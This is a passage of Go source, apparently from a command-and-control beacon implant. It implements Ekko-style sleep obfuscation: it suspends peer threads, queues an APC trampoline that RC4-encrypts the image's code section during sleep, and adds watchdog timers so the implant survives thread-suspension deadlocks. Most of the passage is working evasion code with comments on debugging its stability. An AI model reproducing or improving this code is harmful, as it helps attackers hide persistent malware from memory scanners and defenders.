	// exactly what resc_att2 exhibited (log ended at "enter Sleep",
	// never emitted "suspend done", no WATCHDOG lines because arming
	// hadn't happened yet).
	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
	peers, err := suspendAndArmPeers(currentTID, imageBase, imageEnd, wdTimeoutMs)
	if err != nil {
		errorsTotal.Add(1)
		dbg("cycle=%d suspendAndArmPeers err=%v", cycle, err)
		return err
	}
	dbg("cycle=%d suspend done peers=%d currentTID=%d", cycle, len(peers), currentTID)

	// CANCEL WATCHDOGS + VERIFY STATE BEFORE ENCRYPTION.
	//
	// If any per-peer watchdog fired during the suspend loop (i.e. a
	// P-handoff deadlock happened and was rescued), the affected peer
	// is now running. Entering the encryption phase — where `.text`
	// loses its executable bit — while any peer is running would AV
	// that peer's next instruction fetch and crash the whole process.
	// (This exact pattern was demonstrated experimentally: manually
	// resuming stuck peers via Process Hacker unwedged the beacon, but
	// it crashed a few seconds later once encryption started with the
	// externally-resumed peers still running.)
	//
	// Cancel timers first so their state is stable. Then query each
	// peer's ThreadSuspendCount. If any is 0, abort — do not encrypt
	// this cycle. Drain-resume everyone and return. The beacon skips
	// one cycle of memory obfuscation but survives cleanly.
	cancelWatchdogs(peers)
	if allSuspended, badTID := verifyAllPeersSuspended(peers); !allSuspended {
		dbg("cycle=%d WATCHDOG rescued during suspend loop (tid=%d not suspended) — aborting encryption", cycle, badTID)
		errorsTotal.Add(1)
		// Abort path also gets resume-phase watchdogs — if the abort's
		// own resume loop deadlocks (same P-handoff race), the timers
		// will rescue it.
		armResumeWatchdogs(peers)
		resumeAndClose(cycle, peers)
		return nil
	}

	// SuspendThread is asynchronous — give the kernel a moment to commit
	// each suspension before we start mutating the image. Without this,
	// a peer could still be executing an in-flight instruction when we
	// begin the RC4 pass. This is the deliberate replacement for the
	// GetThreadContext-after-SuspendThread trick, which had no timeout
	// and hung in the Ekko debugging campaign.
	commitDelay := -commitDelayMs * 10_000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&commitDelay)))

	// Queue the APC. It will not be delivered until this thread enters an
	// alertable wait — which happens on the very next line.
	ret, _, _ := procQueueUserAPC.Call(
		tramp,
		uintptr(hSelf),
		uintptr(unsafe.Pointer(args)),
	)
	if ret == 0 {
		// Never entered the encrypted window — safe to resume immediately
		// and bail. Failing to resume peers here would leave the process
		// deadlocked with no way out.
		dbg("cycle=%d QueueUserAPC returned 0", cycle)
		armResumeWatchdogs(peers)
		resumeAndClose(cycle, peers)
		errorsTotal.Add(1)
		return errors.New("apc: QueueUserAPC failed")
	}
	dbg("cycle=%d entering alertable wait", cycle)

	// Enter the alertable wait. The kernel notices the queued APC,
	// dispatches the trampoline (which runs the whole encrypt/sleep/
	// decrypt cycle synchronously), and returns STATUS_USER_APC when the
	// trampoline is done. We wait on the current-process handle because
	// NtWaitForSingleObject requires SOME valid handle and the process
	// handle never signals from inside the process — the wait can only
	// return via the APC completion path.
	//
	// Timeout=0 as a PLARGE_INTEGER argument means NULL, which the kernel
	// interprets as "wait indefinitely."
	procNtWaitForSingleObject.Call(
		uintptr(windows.CurrentProcess()),
		1, // Alertable = TRUE
		0, // Timeout = NULL (INFINITE)
	)

	dbg("cycle=%d alertable wait returned", cycle)

	// -------- RESUME PEERS + CLOSE HANDLES --------
	// Image is decrypted and executable again; peers are safe to run.
	//
	// Arm resume-phase watchdogs BEFORE calling resumeAndClose. Each
	// timer will fire ResumeThread(peer) if the resume loop is still
	// running resumeWatchdogMs later — safety net against the
	// P-handoff race that we've now seen deadlock the resume path
	// (resc_att3 hung between "resume begin" and "Sleep returning"
	// with a just-resumed peer holding a P nobody else could reclaim).
	//
	// resumeAndClose cancels each timer as part of its per-peer
	// cleanup, so a normal-path resume that completes fast will
	// cancel timers before they fire; a deadlocked resume will get
	// rescued when timers fire and start resuming peers externally.
	armResumeWatchdogs(peers)
	resumeAndClose(cycle, peers)

	// If our actual sleep duration significantly exceeded the intended
	// duration, some watchdog timer must have fired to rescue us. This
	// is our top-signal event.
	elapsedMs := uint64(time.Since(sleepStart).Milliseconds())
	if elapsedMs > sleepMs+watchdogMarginMinMs {
		dbg("cycle=%d WATCHDOG likely RESCUED (elapsedMs=%d intendedMs=%d)",
			cycle, elapsedMs, sleepMs)
	}

	dbg("cycle=%d Sleep returning", cycle)

	// Keep the buffers referenced through the unmanaged execution above.
	// Go's escape analysis handles &args and &keyBuf, but an explicit
	// KeepAlive documents the invariant and is defensive against future
	// compiler changes.
	runtime.KeepAlive(keyBuf)
	runtime.KeepAlive(args)

	return nil
}
